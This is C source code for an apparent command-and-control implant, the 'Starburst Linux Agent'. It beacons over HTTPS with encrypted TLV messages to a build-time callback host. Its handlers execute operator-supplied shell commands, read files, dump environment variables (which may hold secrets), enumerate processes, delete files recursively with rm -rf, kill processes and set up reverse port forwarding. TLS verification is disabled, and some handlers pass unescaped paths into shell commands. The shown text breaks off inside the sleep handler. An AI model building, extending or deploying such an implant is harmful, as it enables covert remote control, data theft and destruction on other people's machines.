/*
 * Starburst Linux Agent - minimal static ELF
 * Speaks Starburst binary TLV protocol over HTTPS
 * Build: gcc -static -o starburst starburst_linux.c -lssl -lcrypto -lpthread -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>

/* ======== COMPILE-TIME CONFIG (injected by build system) ======== */
#ifndef CFG_PAYLOAD_UUID
#define CFG_PAYLOAD_UUID "PAYLOAD_UUID_HERE_00000000000000"
#endif
#ifndef CFG_AES_KEY_HEX
#define CFG_AES_KEY_HEX "0000000000000000000000000000000000000000000000000000000000000000"
#endif
#ifndef CFG_CALLBACK_HOST
#define CFG_CALLBACK_HOST "127.0.0.1"
#endif
#ifndef CFG_CALLBACK_PORT
#define CFG_CALLBACK_PORT 9443
#endif
#ifndef CFG_POST_URI
#define CFG_POST_URI "agent_message"
#endif
#ifndef CFG_SLEEP_INTERVAL
#define CFG_SLEEP_INTERVAL 5
#endif
#ifndef CFG_SLEEP_JITTER
#define CFG_SLEEP_JITTER 0
#endif

/* ======== ACTION BYTES ======== */
#define ACTION_CHECKIN       0x01
#define ACTION_GET_TASKING   0x02
#define ACTION_POST_RESPONSE 0x03
#define ACTION_CHECKIN_RSP   0x04
#define ACTION_RPFWD_MSG     0x09

/* ======== COMMAND IDs ======== */
#define CMD_EXIT     0x01
#define CMD_SLEEP    0x02
#define CMD_SHELL    0x03
#define CMD_DOWNLOAD 0x05
#define CMD_LS       0x06
#define CMD_CD       0x07
#define CMD_PWD      0x08
#define CMD_PS       0x09
#define CMD_WHOAMI   0x0A
#define CMD_CAT      0x0E
#define CMD_MKDIR    0x0F
#define CMD_RM       0x10
#define CMD_CP       0x11
#define CMD_MV       0x12
#define CMD_ENV      0x13
#define CMD_IFCONFIG 0x1D
#define CMD_KILL     0x1F
#define CMD_RUN      0x20
#define CMD_RPFWD    0x2F

/* ======== RESPONSE STATUS ======== */
#define RSP_SUCCESS    0x00
#define RSP_ERROR      0x01
#define RSP_PROCESSING 0x02

/* ======== DOWNLOAD SUB-PROTOCOL ======== */
#define DOWNLOAD_INIT      0x10
#define DOWNLOAD_RESP_CMD  0x2C

/* ======== LIMITS ======== */
#define MAX_TLV_SIZE   (4 * 1024 * 1024)
#define CHUNK_SIZE     (512 * 1024)

/* ======== GLOBAL STATE ======== */
static char g_uuid[40];
static uint8_t g_aes_key[32];
static int g_sleep_interval;
static int g_sleep_jitter;
static int g_running = 1;
static SSL_CTX *g_ssl_ctx = NULL;
static char g_callback_host[256];
static int g_callback_port;
static char g_post_uri[256];

/* response queue */
static uint8_t *g_rsp_buf = NULL;
static uint32_t g_rsp_len = 0;
static uint32_t g_rsp_cap = 0;

/* pending downloads */
typedef struct {
    char task_uuid[40];
    char file_path[1024];
    FILE *fp;
    uint32_t total_size;
    uint32_t sent;
    char file_id[40];
    int active;
    int awaiting_file_id;
} download_slot_t;

#define MAX_DOWNLOADS 4
static download_slot_t g_downloads[MAX_DOWNLOADS];

/* ======== RPFWD STATE ======== */
#define RPFWD_MAX_CONNS 64
#define RPFWD_RECV_BUF  65536

typedef struct {
    uint32_t server_id;
    int      sock;
    int      active;
    int      connected;
} rpfwd_conn_t;

static struct {
    rpfwd_conn_t conns[RPFWD_MAX_CONNS];
    uint32_t     conn_count;
    int          active;
    int          saved_sleep;
    char         target_host[256];
    uint16_t     target_port;
} g_rpfwd;

/* ================================================================
 *  BASE64
 * ================================================================ */

static char *b64_encode(const uint8_t *data, size_t len, size_t *out_len) {
    BIO *bio, *b64;
    BUF_MEM *bptr;

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new(BIO_s_mem());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    BIO_write(bio, data, (int)len);
    BIO_flush(bio);
    BIO_get_mem_ptr(bio, &bptr);

    char *out = (char *)malloc(bptr->length + 1);
    memcpy(out, bptr->data, bptr->length);
    out[bptr->length] = '\0';
    if (out_len) *out_len = bptr->length;
    BIO_free_all(bio);
    return out;
}

static uint8_t *b64_decode(const char *input, size_t in_len, size_t *out_len) {
    BIO *bio, *b64;
    uint8_t *buf = (uint8_t *)malloc(in_len);
    memset(buf, 0, in_len);

    b64 = BIO_new(BIO_f_base64());
    bio = BIO_new_mem_buf(input, (int)in_len);
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    int decoded = BIO_read(bio, buf, (int)in_len);
    if (decoded < 0) decoded = 0;
    if (out_len) *out_len = (size_t)decoded;
    BIO_free_all(bio);
    return buf;
}

/* ================================================================
 *  TLV PACKER
 * ================================================================ */

typedef struct {
    uint8_t *data;
    uint32_t len;
    uint32_t cap;
} packer_t;

static void pk_init(packer_t *p) {
    p->cap = 1024;
    p->data = (uint8_t *)malloc(p->cap);
    p->len = 0;
}

static void pk_ensure(packer_t *p, uint32_t need) {
    while (p->len + need > p->cap) {
        p->cap *= 2;
        p->data = (uint8_t *)realloc(p->data, p->cap);
    }
}

static void pk_byte(packer_t *p, uint8_t v) {
    pk_ensure(p, 1);
    p->data[p->len++] = v;
}

static void pk_int32(packer_t *p, uint32_t v) {
    pk_ensure(p, 4);
    p->data[p->len++] = (v >> 24) & 0xFF;
    p->data[p->len++] = (v >> 16) & 0xFF;
    p->data[p->len++] = (v >> 8) & 0xFF;
    p->data[p->len++] = v & 0xFF;
}

static void pk_bytes(packer_t *p, const uint8_t *d, uint32_t dlen) {
    pk_int32(p, dlen);
    pk_ensure(p, dlen);
    memcpy(p->data + p->len, d, dlen);
    p->len += dlen;
}

static void pk_string(packer_t *p, const char *s) {
    uint32_t slen = s ? (uint32_t)strlen(s) : 0;
    pk_bytes(p, (const uint8_t *)s, slen);
}

static void pk_free(packer_t *p) {
    free(p->data);
    p->data = NULL;
    p->len = p->cap = 0;
}

/* ================================================================
 *  TLV PARSER
 * ================================================================ */

typedef struct {
    const uint8_t *data;
    uint32_t len;
    uint32_t off;
} parser_t;

static void pr_init(parser_t *p, const uint8_t *data, uint32_t len) {
    p->data = data;
    p->len = len;
    p->off = 0;
}

static uint8_t pr_byte(parser_t *p) {
    if (p->off >= p->len) return 0;
    return p->data[p->off++];
}

static uint32_t pr_int32(parser_t *p) {
    if (p->off + 4 > p->len) return 0;
    uint32_t v = ((uint32_t)p->data[p->off] << 24) |
                 ((uint32_t)p->data[p->off+1] << 16) |
                 ((uint32_t)p->data[p->off+2] << 8) |
                 (uint32_t)p->data[p->off+3];
    p->off += 4;
    return v;
}

static const uint8_t *pr_bytes(parser_t *p, uint32_t *out_len) {
    uint32_t blen = pr_int32(p);
    if (p->off + blen > p->len) { *out_len = 0; return NULL; }
    const uint8_t *ptr = p->data + p->off;
    p->off += blen;
    *out_len = blen;
    return ptr;
}

static char *pr_string(parser_t *p) {
    uint32_t slen;
    const uint8_t *raw = pr_bytes(p, &slen);
    if (!raw) {
        char *empty = (char *)malloc(1);
        empty[0] = '\0';
        return empty;
    }
    char *s = (char *)malloc(slen + 1);
    memcpy(s, raw, slen);
    s[slen] = '\0';
    return s;
}

static void pr_raw(parser_t *p, uint8_t *out, uint32_t count) {
    if (p->off + count > p->len) return;
    memcpy(out, p->data + p->off, count);
    p->off += count;
}

static uint32_t pr_remaining(parser_t *p) {
    return p->len > p->off ? p->len - p->off : 0;
}

/* ================================================================
 *  CRYPTO: AES-256-CBC + HMAC-SHA256
 * ================================================================ */

static void hex_to_bytes(const char *hex, uint8_t *out, int len) {
    for (int i = 0; i < len; i++) {
        unsigned int b;
        sscanf(hex + i * 2, "%02x", &b);
        out[i] = (uint8_t)b;
    }
}

static uint8_t *aes_encrypt(const uint8_t *plaintext, uint32_t pt_len, uint32_t *out_len) {
    /* PKCS7 padding */
    uint32_t pad = 16 - (pt_len % 16);
    uint32_t padded_len = pt_len + pad;
    uint8_t *padded = (uint8_t *)malloc(padded_len);
    memcpy(padded, plaintext, pt_len);
    memset(padded + pt_len, (uint8_t)pad, pad);

    /* random IV */
    uint8_t iv[16];
    RAND_bytes(iv, 16);

    /* encrypt */
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_set_padding(ctx, 0);
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, g_aes_key, iv);

    uint8_t *ct = (uint8_t *)malloc(padded_len + 16);
    int ct_len = 0, final_len = 0;
    EVP_EncryptUpdate(ctx, ct, &ct_len, padded, (int)padded_len);
    EVP_EncryptFinal_ex(ctx, ct + ct_len, &final_len);
    ct_len += final_len;
    EVP_CIPHER_CTX_free(ctx);
    free(padded);

    /* HMAC-SHA256(key, IV + ciphertext) */
    uint32_t hmac_input_len = 16 + (uint32_t)ct_len;
    uint8_t *hmac_input = (uint8_t *)malloc(hmac_input_len);
    memcpy(hmac_input, iv, 16);
    memcpy(hmac_input + 16, ct, ct_len);

    uint8_t hmac[32];
    unsigned int hmac_len = 32;
    HMAC(EVP_sha256(), g_aes_key, 32, hmac_input, hmac_input_len, hmac, &hmac_len);
    free(hmac_input);

    /* output: IV(16) + ciphertext + HMAC(32) */
    uint32_t total = 16 + (uint32_t)ct_len + 32;
    uint8_t *result = (uint8_t *)malloc(total);
    memcpy(result, iv, 16);
    memcpy(result + 16, ct, ct_len);
    memcpy(result + 16 + ct_len, hmac, 32);
    free(ct);

    *out_len = total;
    return result;
}

static uint8_t *aes_decrypt(const uint8_t *blob, uint32_t blob_len, uint32_t *out_len) {
    if (blob_len < 48) return NULL; /* IV(16) + min_ct(0) + HMAC(32) */

    const uint8_t *iv = blob;
    uint32_t ct_len = blob_len - 16 - 32;
    const uint8_t *ct = blob + 16;
    const uint8_t *recv_hmac = blob + blob_len - 32;

    /* verify HMAC */
    uint8_t calc_hmac[32];
    unsigned int hmac_len = 32;
    HMAC(EVP_sha256(), g_aes_key, 32, blob, 16 + ct_len, calc_hmac, &hmac_len);
    if (CRYPTO_memcmp(calc_hmac, recv_hmac, 32) != 0) {
        return NULL;
    }

    /* decrypt */
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    EVP_CIPHER_CTX_set_padding(ctx, 0);
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, g_aes_key, iv);

    uint8_t *pt = (uint8_t *)malloc(ct_len + 16);
    int pt_len = 0, final_len = 0;
    EVP_DecryptUpdate(ctx, pt, &pt_len, ct, (int)ct_len);
    EVP_DecryptFinal_ex(ctx, pt + pt_len, &final_len);
    pt_len += final_len;
    EVP_CIPHER_CTX_free(ctx);

    /* strip PKCS7 */
    if (pt_len > 0) {
        uint8_t pad_val = pt[pt_len - 1];
        if (pad_val > 0 && pad_val <= 16) {
            pt_len -= pad_val;
        }
    }

    *out_len = (uint32_t)pt_len;
    return pt;
}

/* ================================================================
 *  HTTPS TRANSPORT
 * ================================================================ */

static int ssl_init(void) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    g_ssl_ctx = SSL_CTX_new(TLS_client_method());
    if (!g_ssl_ctx) return -1;

    SSL_CTX_set_verify(g_ssl_ctx, SSL_VERIFY_NONE, NULL);
    return 0;
}

static uint8_t *https_post(const char *host, int port, const char *uri,
                           const uint8_t *body, uint32_t body_len,
                           uint32_t *resp_len) {
    *resp_len = 0;

    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0) return NULL;

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return NULL; }

    /* set socket timeouts to prevent indefinite blocking */
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock);
        freeaddrinfo(res);
        return NULL;
    }
    freeaddrinfo(res);

    SSL *ssl = SSL_new(g_ssl_ctx);
    SSL_set_fd(ssl, sock);
    if (SSL_connect(ssl) <= 0) {
        SSL_free(ssl);
        close(sock);
        return NULL;
    }

    /* build HTTP request */
    char header[1024];
    int hlen = snprintf(header, sizeof(header),
        "POST /%s HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %u\r\n"
        "Connection: close\r\n"
        "\r\n",
        uri, host, port, body_len);

    SSL_write(ssl, header, hlen);
    SSL_write(ssl, body, (int)body_len);

    /* read response */
    uint32_t buf_cap = 65536;
    uint8_t *buf = (uint8_t *)malloc(buf_cap);
    uint32_t buf_len = 0;
    int n;
    while ((n = SSL_read(ssl, buf + buf_len, (int)(buf_cap - buf_len))) > 0) {
        buf_len += (uint32_t)n;
        if (buf_len + 4096 > buf_cap) {
            buf_cap *= 2;
            buf = (uint8_t *)realloc(buf, buf_cap);
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);

    /* find body (after \r\n\r\n) */
    uint8_t *body_start = NULL;
    for (uint32_t i = 0; i + 3 < buf_len; i++) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            body_start = buf + i + 4;
            break;
        }
    }
    if (!body_start) { free(buf); return NULL; }

    uint32_t body_size = buf_len - (uint32_t)(body_start - buf);
    uint8_t *result = (uint8_t *)malloc(body_size);
    memcpy(result, body_start, body_size);
    *resp_len = body_size;
    free(buf);
    return result;
}

/* ================================================================
 *  AGENT <-> MYTHIC COMMUNICATION
 * ================================================================ */

/* Send TLV data, receive TLV response.
 * Wraps in: base64(UUID + AES(tlv_data))
 * Unwraps:  base64 decode -> skip 36-byte UUID -> AES decrypt */
static uint8_t *agent_send(const uint8_t *tlv, uint32_t tlv_len, uint32_t *out_len) {
    *out_len = 0;

    /* encrypt */
    uint32_t enc_len;
    uint8_t *enc = aes_encrypt(tlv, tlv_len, &enc_len);
    if (!enc) return NULL;

    /* prepend UUID (36 bytes) + encrypted */
    uint32_t uuid_len = (uint32_t)strlen(g_uuid);
    uint32_t raw_len = uuid_len + enc_len;
    uint8_t *raw = (uint8_t *)malloc(raw_len);
    memcpy(raw, g_uuid, uuid_len);
    memcpy(raw + uuid_len, enc, enc_len);
    free(enc);

    /* base64 encode */
    size_t b64_len;
    char *b64 = b64_encode(raw, raw_len, &b64_len);
    free(raw);

    /* POST */
    uint32_t resp_b64_len;
    uint8_t *resp_b64 = https_post(g_callback_host, g_callback_port,
                                    g_post_uri, (uint8_t *)b64, (uint32_t)b64_len,
                                    &resp_b64_len);
    free(b64);
    if (!resp_b64 || resp_b64_len == 0) {
        free(resp_b64);
        return NULL;
    }

    /* base64 decode response */
    size_t resp_raw_len;
    uint8_t *resp_raw = b64_decode((char *)resp_b64, resp_b64_len, &resp_raw_len);
    free(resp_b64);

    if (resp_raw_len <= 36) { free(resp_raw); return NULL; }

    /* skip 36-byte UUID prefix, decrypt rest */
    uint32_t dec_len;
    uint8_t *dec = aes_decrypt(resp_raw + 36, (uint32_t)(resp_raw_len - 36), &dec_len);
    free(resp_raw);

    if (!dec) return NULL;

    *out_len = dec_len;
    return dec;
}

/* ================================================================
 *  RESPONSE QUEUE
 * ================================================================ */

static void rsp_queue(const uint8_t *data, uint32_t dlen) {
    uint32_t needed = g_rsp_len + 4 + dlen;
    if (needed > g_rsp_cap) {
        uint32_t nc = g_rsp_cap == 0 ? 4096 : g_rsp_cap;
        while (nc < needed) nc *= 2;
        g_rsp_buf = (uint8_t *)realloc(g_rsp_buf, nc);
        g_rsp_cap = nc;
    }
    uint8_t *q = g_rsp_buf + g_rsp_len;
    q[0] = (dlen >> 24) & 0xFF;
    q[1] = (dlen >> 16) & 0xFF;
    q[2] = (dlen >> 8) & 0xFF;
    q[3] = dlen & 0xFF;
    memcpy(q + 4, data, dlen);
    g_rsp_len += 4 + dlen;
}

static void queue_response(const char *task_uuid, uint8_t status, const char *output) {
    packer_t p;
    pk_init(&p);
    pk_byte(&p, ACTION_POST_RESPONSE);
    pk_string(&p, task_uuid);
    pk_byte(&p, status);
    pk_string(&p, output);
    rsp_queue(p.data, p.len);
    pk_free(&p);
}

/* ================================================================
 *  COMMAND HANDLERS
 * ================================================================ */

static void cmd_shell(const char *task_uuid, parser_t *params) {
    char *command = pr_string(params);
    FILE *fp = popen(command, "r");
    if (!fp) {
        queue_response(task_uuid, RSP_ERROR, "popen failed");
        free(command);
        return;
    }

    size_t buf_cap = 4096, buf_len = 0;
    char *buf = (char *)malloc(buf_cap);
    int n;
    while ((n = fread(buf + buf_len, 1, buf_cap - buf_len - 1, fp)) > 0) {
        buf_len += (size_t)n;
        if (buf_len + 1024 > buf_cap) {
            buf_cap *= 2;
            buf = (char *)realloc(buf, buf_cap);
        }
    }
    buf[buf_len] = '\0';
    pclose(fp);

    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
    free(command);
}

static void cmd_ls(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    DIR *d = opendir(path);
    if (!d) {
        char err[256];
        snprintf(err, sizeof(err), "opendir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(path);
        return;
    }

    size_t buf_cap = 8192, buf_len = 0;
    char *buf = (char *)malloc(buf_cap);
    buf[0] = '\0';

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        struct stat st;
        char fullpath[2048];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, ent->d_name);
        if (stat(fullpath, &st) == 0) {
            char line[512];
            int llen = snprintf(line, sizeof(line), "%c%c%c%c%c%c%c%c%c%c %8ld %s\n",
                S_ISDIR(st.st_mode) ? 'd' : '-',
                st.st_mode & S_IRUSR ? 'r' : '-',
                st.st_mode & S_IWUSR ? 'w' : '-',
                st.st_mode & S_IXUSR ? 'x' : '-',
                st.st_mode & S_IRGRP ? 'r' : '-',
                st.st_mode & S_IWGRP ? 'w' : '-',
                st.st_mode & S_IXGRP ? 'x' : '-',
                st.st_mode & S_IROTH ? 'r' : '-',
                st.st_mode & S_IWOTH ? 'w' : '-',
                st.st_mode & S_IXOTH ? 'x' : '-',
                (long)st.st_size, ent->d_name);

            if (buf_len + (size_t)llen + 1 > buf_cap) {
                buf_cap *= 2;
                buf = (char *)realloc(buf, buf_cap);
            }
            memcpy(buf + buf_len, line, llen);
            buf_len += (size_t)llen;
        }
    }
    buf[buf_len] = '\0';
    closedir(d);

    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
    free(path);
}

static void cmd_pwd(const char *task_uuid) {
    char cwd[2048];
    if (getcwd(cwd, sizeof(cwd))) {
        queue_response(task_uuid, RSP_SUCCESS, cwd);
    } else {
        queue_response(task_uuid, RSP_ERROR, strerror(errno));
    }
}

static void cmd_cd(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    if (chdir(path) == 0) {
        char cwd[2048];
        getcwd(cwd, sizeof(cwd));
        queue_response(task_uuid, RSP_SUCCESS, cwd);
    } else {
        char err[256];
        snprintf(err, sizeof(err), "chdir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(path);
}

static void cmd_whoami(const char *task_uuid) {
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        char buf[256];
        snprintf(buf, sizeof(buf), "%s (uid=%d)", pw->pw_name, getuid());
        queue_response(task_uuid, RSP_SUCCESS, buf);
    } else {
        char buf[64];
        snprintf(buf, sizeof(buf), "uid=%d", getuid());
        queue_response(task_uuid, RSP_SUCCESS, buf);
    }
}

static void cmd_cat(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    FILE *fp = fopen(path, "r");
    if (!fp) {
        char err[256];
        snprintf(err, sizeof(err), "fopen: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
        free(path);
        return;
    }

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (size > MAX_TLV_SIZE) size = MAX_TLV_SIZE;

    char *buf = (char *)malloc((size_t)size + 1);
    size_t rd = fread(buf, 1, (size_t)size, fp);
    buf[rd] = '\0';
    fclose(fp);

    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
    free(path);
}

static void cmd_env(const char *task_uuid) {
    extern char **environ;
    size_t buf_cap = 8192, buf_len = 0;
    char *buf = (char *)malloc(buf_cap);
    buf[0] = '\0';

    for (char **e = environ; *e; e++) {
        size_t elen = strlen(*e);
        if (buf_len + elen + 2 > buf_cap) {
            buf_cap *= 2;
            buf = (char *)realloc(buf, buf_cap);
        }
        memcpy(buf + buf_len, *e, elen);
        buf_len += elen;
        buf[buf_len++] = '\n';
    }
    buf[buf_len] = '\0';

    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
}

static void cmd_ps(const char *task_uuid) {
    DIR *d = opendir("/proc");
    if (!d) {
        queue_response(task_uuid, RSP_ERROR, "cannot open /proc");
        return;
    }

    size_t buf_cap = 16384, buf_len = 0;
    char *buf = (char *)malloc(buf_cap);
    int blen = snprintf(buf, buf_cap, "%-8s %-8s %-8s %s\n", "PID", "PPID", "USER", "CMD");
    buf_len = (size_t)blen;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        int pid = atoi(ent->d_name);
        if (pid <= 0) continue;

        char status_path[128], cmdline_path[128];
        snprintf(status_path, sizeof(status_path), "/proc/%d/status", pid);
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);

        int ppid = 0;
        int uid = -1;
        char name[256] = "";

        FILE *fp = fopen(status_path, "r");
        if (fp) {
            char line[512];
            while (fgets(line, sizeof(line), fp)) {
                if (strncmp(line, "Name:", 5) == 0) {
                    sscanf(line + 5, " %255s", name);
                } else if (strncmp(line, "PPid:", 5) == 0) {
                    sscanf(line + 5, " %d", &ppid);
                } else if (strncmp(line, "Uid:", 4) == 0) {
                    sscanf(line + 4, " %d", &uid);
                }
            }
            fclose(fp);
        }

        /* try to get full cmdline */
        char cmdline[512] = "";
        fp = fopen(cmdline_path, "r");
        if (fp) {
            int rn = (int)fread(cmdline, 1, sizeof(cmdline) - 1, fp);
            fclose(fp);
            for (int i = 0; i < rn; i++) {
                if (cmdline[i] == '\0') cmdline[i] = ' ';
            }
            cmdline[rn] = '\0';
        }

        char line[1024];
        int ll = snprintf(line, sizeof(line), "%-8d %-8d %-8d %s\n",
                          pid, ppid, uid, cmdline[0] ? cmdline : name);

        if (buf_len + (size_t)ll + 1 > buf_cap) {
            buf_cap *= 2;
            buf = (char *)realloc(buf, buf_cap);
        }
        memcpy(buf + buf_len, line, ll);
        buf_len += (size_t)ll;
    }
    buf[buf_len] = '\0';
    closedir(d);

    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf);
}

static void cmd_ifconfig(const char *task_uuid) {
    /* Parse /proc/net and ip addr into browser-script-compatible format:
     * <name>\nMAC: xx:xx:xx\nIP: addr/prefix\n\n */
    FILE *fp = popen("ip -o addr show 2>/dev/null", "r");
    if (!fp) {
        queue_response(task_uuid, RSP_ERROR, "failed to run ip addr");
        return;
    }

    size_t cap = 8192, len = 0;
    char *out = (char *)malloc(cap);
    out[0] = '\0';

    /* track which interfaces we've seen for MAC lookup */
    char seen[32][32];
    int seen_count = 0;

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        /* ip -o addr format: "2: eth0    inet 10.0.0.1/24 brd 10.0.0.255 scope global eth0" */
        char iface[64] = {0}, family[16] = {0}, addr[128] = {0};
        int idx = 0;
        if (sscanf(line, "%d: %63s %15s %127s", &idx, iface, family, addr) < 4)
            continue;

        /* strip trailing backslash from iface name */
        char *bs = strchr(iface, '\\');
        if (bs) *bs = '\0';

        int is_new = 1;
        for (int i = 0; i < seen_count; i++) {
            if (strcmp(seen[i], iface) == 0) { is_new = 0; break; }
        }

        if (is_new && seen_count < 32) {
            strncpy(seen[seen_count++], iface, 31);

            /* get MAC address */
            char mac_cmd[128];
            snprintf(mac_cmd, sizeof(mac_cmd),
                     "cat /sys/class/net/%s/address 2>/dev/null", iface);
            FILE *mfp = popen(mac_cmd, "r");
            char mac[32] = {0};
            if (mfp) {
                if (fgets(mac, sizeof(mac), mfp)) {
                    char *nl = strchr(mac, '\n');
                    if (nl) *nl = '\0';
                }
                pclose(mfp);
            }

            /* write adapter header */
            int wrote = snprintf(out + len, cap - len, "%s\nMAC: %s\n", iface, mac);
            len += (size_t)wrote;
        }

        /* add IP line */
        if (strcmp(family, "inet") == 0 || strcmp(family, "inet6") == 0) {
            if (len + 256 > cap) { cap *= 2; out = (char *)realloc(out, cap); }
            int wrote = snprintf(out + len, cap - len, "IP: %s\n", addr);
            len += (size_t)wrote;
        }
    }
    pclose(fp);

    /* add blank lines between adapters for browser script block splitting */
    /* already structured with newlines; add trailing separator per adapter */
    if (len > 0 && out[len-1] != '\n') {
        out[len++] = '\n';
    }

    out[len] = '\0';

    /* reformat: insert blank line before each adapter name */
    size_t final_cap = cap * 2;
    char *final = (char *)malloc(final_cap);
    size_t flen = 0;
    int first_adapter = 1;

    char *p = out;
    while (*p) {
        char *eol = strchr(p, '\n');
        if (!eol) break;
        size_t linelen = (size_t)(eol - p);

        /* detect adapter header line (not starting with MAC:/IP:/GW:) */
        int is_header = (linelen > 0 &&
                         strncmp(p, "MAC:", 4) != 0 &&
                         strncmp(p, "IP:", 3) != 0 &&
                         strncmp(p, "GW:", 3) != 0 &&
                         strncmp(p, "DHCP:", 5) != 0);

        if (is_header && !first_adapter) {
            final[flen++] = '\n';
        }
        if (is_header) first_adapter = 0;

        if (flen + linelen + 2 > final_cap) {
            final_cap *= 2;
            final = (char *)realloc(final, final_cap);
        }
        memcpy(final + flen, p, linelen);
        flen += linelen;
        final[flen++] = '\n';

        p = eol + 1;
    }
    final[flen] = '\0';

    queue_response(task_uuid, RSP_SUCCESS, final);
    free(out);
    free(final);
}

static void cmd_mkdir_handler(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    if (mkdir(path, 0755) == 0) {
        queue_response(task_uuid, RSP_SUCCESS, path);
    } else {
        char err[256];
        snprintf(err, sizeof(err), "mkdir: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(path);
}

static void cmd_rm_handler(const char *task_uuid, parser_t *params) {
    char *path = pr_string(params);
    struct stat st;
    int rc;
    if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
        char cmd[2048];
        snprintf(cmd, sizeof(cmd), "rm -rf '%s'", path);
        rc = system(cmd);
    } else {
        rc = unlink(path);
    }
    if (rc == 0) {
        queue_response(task_uuid, RSP_SUCCESS, "removed");
    } else {
        char err[256];
        snprintf(err, sizeof(err), "rm: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(path);
}

static void cmd_cp_handler(const char *task_uuid, parser_t *params) {
    char *src = pr_string(params);
    char *dst = pr_string(params);
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "cp -r '%s' '%s' 2>&1", src, dst);
    FILE *fp = popen(cmd, "r");
    char out[1024] = "";
    if (fp) { fread(out, 1, sizeof(out) - 1, fp); pclose(fp); }
    queue_response(task_uuid, RSP_SUCCESS, out[0] ? out : "copied");
    free(src); free(dst);
}

static void cmd_mv_handler(const char *task_uuid, parser_t *params) {
    char *src = pr_string(params);
    char *dst = pr_string(params);
    if (rename(src, dst) == 0) {
        queue_response(task_uuid, RSP_SUCCESS, "moved");
    } else {
        char err[256];
        snprintf(err, sizeof(err), "mv: %s", strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
    free(src); free(dst);
}

static void cmd_kill_handler(const char *task_uuid, parser_t *params) {
    uint32_t pid = pr_int32(params);
    if (kill((pid_t)pid, SIGKILL) == 0) {
        queue_response(task_uuid, RSP_SUCCESS, "killed");
    } else {
        char err[256];
        snprintf(err, sizeof(err), "kill(%u): %s", pid, strerror(errno));
        queue_response(task_uuid, RSP_ERROR, err);
    }
}

static void cmd_run(const char *task_uuid, parser_t *params) {
    char *command = pr_string(params);
    FILE *fp = popen(command, "r");
    if (!fp) {
        queue_response(task_uuid, RSP_ERROR, "popen failed");
        free(command);
        return;
    }
    size_t cap = 4096, len = 0;
    char *buf = (char *)malloc(cap);
    int n;
    while ((n = fread(buf + len, 1, cap - len - 1, fp)) > 0) {
        len += (size_t)n;
        if (len + 1024 > cap) { cap *= 2; buf = (char *)realloc(buf, cap); }
    }
    buf[len] = '\0';
    pclose(fp);
    queue_response(task_uuid, RSP_SUCCESS, buf);
    free(buf); free(command);
}

static void cmd_sleep_handler(const char *task_uuid, parser_t *params) {
    uint32_t interval = pr_int32(params);
    uint32_t jitter = pr_int32(params);
#ifdef DEBUG_BUILD
    fprintf(stderr, "[sleep] raw interval=%u jitter=%u\n", interval, jitter);
#endif
    g_sleep_interval = (int)(interval / 1000);
    if (g_sleep_interval < 1) g_sleep_interval = 1;
    g_sleep_jitter = (int)jitter;
#ifdef DEBUG_BUILD
    fprintf(stderr, "[sleep] set interval=%d jitter=%d\n", g_sleep_interval, g_sleep_jitter);
#endif

